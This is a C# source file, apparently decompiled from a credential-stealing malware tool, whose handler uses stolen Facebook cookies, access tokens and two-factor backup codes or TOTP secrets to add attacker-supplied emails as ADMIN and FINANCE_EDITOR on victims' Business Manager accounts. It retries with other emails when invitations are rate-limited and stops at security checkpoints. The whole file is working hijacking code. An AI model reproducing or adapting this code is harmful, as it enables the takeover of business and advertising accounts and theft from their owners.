using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using DataExtractor.Core.Models.Json.DataShareLinkJsonModel;
using DataExtractor.Core.Utils;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers.Fb;

internal class ShareDataHandler
{
	private const int TOTAL_BM_LINK = 2;

	public void Run(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler, Action<FbData> haveFbDataNotify)
	{
		GetBmLink(fbData, httpClient, telegramHandler, haveFbDataNotify);
	}

	private void GetBmLink(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler, Action<FbData> haveFbDataNotify)
	{
		fbData.IsCheckpoint = false;
		List<AdsBusiness> list = (from a in fbData.Bussinesses
			where a.IsAdmin
			orderby a.IsVerify descending
			select a).ThenByDescending(delegate(AdsBusiness a)
		{
			int num2 = ((a.clients != null) ? a.clients.Count : 0);
			int num3 = ((a.AdsAccount != null) ? a.AdsAccount.Count : 0);
			return num2 + num3;
		}).ToList();
		int num = 0;
		int countShareSuccess = 0;
		while (num < list.Count && countShareSuccess < 60)
		{
			List<AdsBusiness> list2 = list.Skip(num).Take(5).ToList();
			GetLimitBm(fbData, httpClient, list2, telegramHandler);
			CheckLinkBm(fbData, httpClient, list2, telegramHandler);
			num += 5;
			List<AdsBusiness> list3 = list2.Where((AdsBusiness a) => a.CountBmLink > 0).ToList();
			if (list3.Count == 0)
			{
				fbData.Log("NO bm check");
				continue;
			}
			foreach (AdsBusiness item in list3)
			{
				item.IsCantShareLink = false;
			}
			GetBmByCookies(fbData, httpClient, list3.Where((AdsBusiness a) => a.CountBmLink > 0).ToList(), telegramHandler, ref countShareSuccess);
			if (fbData.IsCheckpoint)
			{
				fbData.Log("Checkpoint");
				break;
			}
			haveFbDataNotify(fbData);
			list3 = list2.Where((AdsBusiness a) => a.CountBmLink > 0 && !a.IsCantShareLink).ToList();
			if (list3.Count > 0)
			{
				fbData.Log("share by token");
				GetBmLinkNormal(fbData, httpClient, list3, telegramHandler, ref countShareSuccess);
				haveFbDataNotify(fbData);
			}
			list3 = list2.Where((AdsBusiness a) => a.CountBmLink > 0 && !a.IsCantShareLink).ToList();
			if (list3.Count > 0)
			{
				fbData.Log("share by cookie next");
				GetBmByCookies(fbData, httpClient, list2.Where((AdsBusiness a) => a.CountBmLink > 0 && !a.IsCantShareLink).ToList(), telegramHandler, ref countShareSuccess);
				haveFbDataNotify(fbData);
			}
		}
	}

	private void GetLimitBm(FbData fbData, HttpClient httpClient, List<AdsBusiness> bmChecked, TelegramHandler telegramHandler)
	{
		new GetInfoAdsAccountHandler().GetLimit(fbData, bmChecked, httpClient, telegramHandler);
	}

	private void CheckLinkBm(FbData fbData, HttpClient httpClient, List<AdsBusiness> bmChecked, TelegramHandler telegramHandler)
	{
		foreach (AdsBusiness item in bmChecked)
		{
			GetPendingUserOfBm(fbData, httpClient, item, telegramHandler);
		}
	}

	private void GetBmLinkNormal(FbData fbData, HttpClient httpClient, List<AdsBusiness> bmChecked, TelegramHandler telegramHandler, ref int countShareSuccess)
	{
		foreach (AdsBusiness item in bmChecked)
		{
			string text = telegramHandler.RandomEmail(item.BmLinks);
			if (text == null)
			{
				fbData.Log("No email");
			}
			string text2 = null;
			if (item.IsCantShareLink)
			{
				text2 = fbData.GetTokenPowerEdit();
				if (string.IsNullOrEmpty(text2))
				{
					if (fbData.AdsAccount.Count <= 0)
					{
						fbData.Log("ko co ads de get token");
						continue;
					}
					fbData.Log("can get lai token");
					text2 = new FbTokenHandler().GetTokenPowerEdit(httpClient, fbData.AdsAccount.First().account_id, fbData);
					if (text2 == null)
					{
						fbData.Log("ko lai dc token");
						continue;
					}
					fbData.FbToken.Tokens.Enqueue(text2);
				}
			}
			else
			{
				text2 = fbData.GetNguongToken();
			}
			string url = "https://graph.facebook.com/v14.0/" + item.id + "/business_users?access_token=" + text2;
			string text3 = "brandId=" + item.id + "&email=" + WebUtility.UrlEncode(text) + "&method=post&pretty=0&roles=%5B%22ADMIN%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1";
			fbData.Log("data send " + text3);
			string text4 = httpClient.PostString(url, text3, "application/x-www-form-urlencoded");
			fbData.Log("share link by token " + item.id + item.name + ": " + text4);
			if (!string.IsNullOrEmpty(text4) && text4.Contains("\"id\""))
			{
				fbData.Log("share success " + text4);
				item.BmLinks.Add(text + " - ADMIN");
				item.CountBmLink--;
				countShareSuccess++;
			}
			else
			{
				fbData.Log("error get link bm : " + text4);
				item.IsCantShareLink = true;
			}
		}
	}

	private void GetBmByCookies(FbData fbData, HttpClient httpClient, List<AdsBusiness> allBusiness, TelegramHandler telegramHandler, ref int countShareSuccess)
	{
		string fbDtsg = null;
		foreach (AdsBusiness item in allBusiness)
		{
			bool flag = CheckBmIs2Fa(httpClient, item, fbData, ref fbDtsg);
			int num = 1;
			while (flag && num-- > 0 && ((fbData.Codes != null && fbData.Codes.Count > 7) || !string.IsNullOrEmpty(fbData.CodeApp)))
			{
				string text = null;
				if (!string.IsNullOrEmpty(fbData.CodeApp))
				{
					text = TotpUtils.GetCodeTotp(fbData.CodeApp);
					fbData.Log("sai code app de chay 2fa vs code " + text);
				}
				else
				{
					text = fbData.Codes.Pop();
					if (text.Length == 16)
					{
						fbData.Codes.Push(text);
						text = fbData.Codes.Pop();
					}
					fbData.Log("chay code " + text);
				}
				if (!string.IsNullOrEmpty(text) && RunFa(text, fbData.UserId, httpClient, fbData))
				{
					flag = CheckBmIs2Fa(httpClient, item, fbData, ref fbDtsg);
				}
			}
			if (flag)
			{
				fbData.Log("BM 2fa verify");
				item.IsCantShareLink = true;
				continue;
			}
			if (string.IsNullOrEmpty(fbDtsg))
			{
				fbDtsg = fbData.Fbdtsg;
			}
			string text2 = telegramHandler.RandomEmail(item.BmLinks);
			if (text2 == null)
			{
				break;
			}
			string url = "https://business.facebook.com/api/graphql";
			num = 0;
			bool flag2 = false;
			do
			{
				flag2 = false;
				string text3 = "av=" + fbData.UserId + "&__user=" + fbData.UserId + "&fb_dtsg=" + WebUtility.UrlEncode(fbDtsg) + "&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BizKitSettingsInviteUserMutation&variables={\"businessID\":\"" + item.id + "\",\"email\":\"" + text2 + "\",\"roles\":[\"ADMIN\",\"FINANCE_EDITOR\"],\"allowed_invite_type\":[\"FB\"]}&server_timestamps=true&doc_id=4388594967888048";
				fbData.Log("data send " + text3);
				string text4 = httpClient.PostString(url, text3, "application/x-www-form-urlencoded", new Dictionary<string, string>
				{
					{ "Sec-Fetch-Dest", "empty" },
					{ "Sec-Fetch-Mode", "cors" },
					{ "Sec-Fetch-Site", "same-origin" }
				});
				fbData.Log("Share data " + item.name + " : " + text4);
				if (string.IsNullOrEmpty(text4))
				{
					fbData.Log("share link ko thanh cong loi share link null");
					return;
				}
				if (text4.Contains("\"id\"") && !text4.Contains("error"))
				{
					fbData.Log("Share link by cookie thành công cho email : " + text2);
					item.BmLinks.Add(text2 + " - ADMIN");
					item.CountBmLink--;
					countShareSuccess++;
					continue;
				}
				if (text4.Contains("You have sent too many invitations to the email address"))
				{
					telegramHandler.RemoveEmail(text2);
					fbData.Log("KO share đc, đổi email khác");
					text2 = telegramHandler.RandomEmail(item.BmLinks);
					flag2 = true;
					continue;
				}
				if (text4.Contains("Two-Factor Authentication Required") || text4.Contains("Two-factor authentication required"))
				{
					fbData.Log("2fa error");
					item.IsCantShareLink = true;
					continue;
				}
				if (text4.Contains("https://www.facebook.com/checkpoint"))
				{
					fbData.Log("check point");
					fbData.IsCheckpoint = true;
					return;
				}
				fbData.Log("Error Share link by cookie : " + text4);
			}
			while (flag2 && num++ < 2);
		}
	}

	private bool CheckBmIs2Fa(HttpClient httpClient, AdsBusiness bm, FbData fbData, ref string fbDtsg)
	{
		string text = "https://business.facebook.com/settings/ad-accounts?business_id=" + bm.id;
		HttpResponseMessage httpResponseMessage = httpClient.Get(text, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		if (httpResponseMessage == null)
		{
			fbData.Log("request failed " + text);
			return false;
		}
		try
		{
			text = httpResponseMessage.RequestMessage.RequestUri.ToString();
			if (text.Contains("twofactor"))
			{
				return true;
			}
			string result = httpResponseMessage.Content.ReadAsStringAsync().Result;
			if (string.IsNullOrEmpty(result))
			{
				return true;
			}
			fbDtsg = result.CutString("[\"DTSGInitialData\",[],{\"token\":\"", "\"");
			if (string.IsNullOrEmpty(fbDtsg))
			{
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			fbData.Log(ex.ToString());
			return false;
		}
	}

	private bool RunFa(string code, string userId, HttpClient httpClient, FbData fbData)
	{
		fbData.Log("bypass 2fa vs code " + code);
		string url = "https://business.facebook.com/security/twofactor/reauth";
		string @string = httpClient.GetString(url);
		if (string.IsNullOrEmpty(@string))
		{
			fbData.Log("cant get data 2fa");
			return true;
		}
		string text = @string.CutString("DTSGInitData\",[],{\"token\":\"", "\"");
		url = "https://business.facebook.com/security/twofactor/reauth/enter";
		string formData = "approvals_code=" + code + "&save_device=false&__user=" + userId + "&__a=1&__comet_req=0&fb_dtsg=" + text + "&__jssesw=1";
		@string = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { { "Sec-Fetch-Site", "same-origin" } });
		fbData.Log("telegram log 2fa " + @string);
		if (@string.Contains("codeConfirmed\":true"))
		{
			fbData.Log("ver 2fa thanh cong");
			return true;
		}
		return false;
	}

	private Queue<string> GenEmail(TelegramHandler telegramHandler, int count)
	{
		int num = 0;
		Queue<string> queue = new Queue<string>();
		while (num++ < count)
		{
			string item = telegramHandler.Emails[RandomUtils.RandomNumber(0, telegramHandler.Emails.Count - 1)];
			queue.Enqueue(item);
		}
		return new Queue<string>(queue);
	}

	private void GetPendingUserOfBm(FbData fbData, HttpClient httpClient, AdsBusiness bm, TelegramHandler telegramHandler)
	{
		if (bm.BmLinks.Count == 0)
		{
			bm.CountBmLink = 2;
		}
		else
		{
			if (bm.CountBmLink == 2)
			{
				return;
			}
			string nguongToken = fbData.GetNguongToken();
			if (nguongToken == null)
			{
				fbData.Log("no token to check pending user");
				return;
			}
			string url = "https://graph.facebook.com/v13.0/" + bm.id + "/pending_users?fields=owner,email,role,invite_link&access_token=" + nguongToken;
			string @string = httpClient.GetString(url);
			if (string.IsNullOrEmpty(@string))
			{
				return;
			}
			try
			{
				fbData.Log("check pending result : " + @string);
				DataShareLinkJsonModel dataShareLinkJsonModel = JsonConvert.DeserializeObject<DataShareLinkJsonModel>(@string);
				if (dataShareLinkJsonModel.data == null)
				{
					return;
				}
				if (dataShareLinkJsonModel.data.Count > 0)
				{
					int num = 0;
					foreach (Datum link in dataShareLinkJsonModel.data)
					{
						string text = bm.BmLinks.FirstOrDefault((string a) => a.Contains(link.email));
						if (text != null)
						{
							num++;
						}
					}
					if (num < 2)
					{
						bm.CountBmLink = 2 - num;
					}
				}
				else
				{
					bm.CountBmLink = 2;
					bm.BmLinks.Clear();
				}
			}
			catch
			{
			}
		}
	}
}
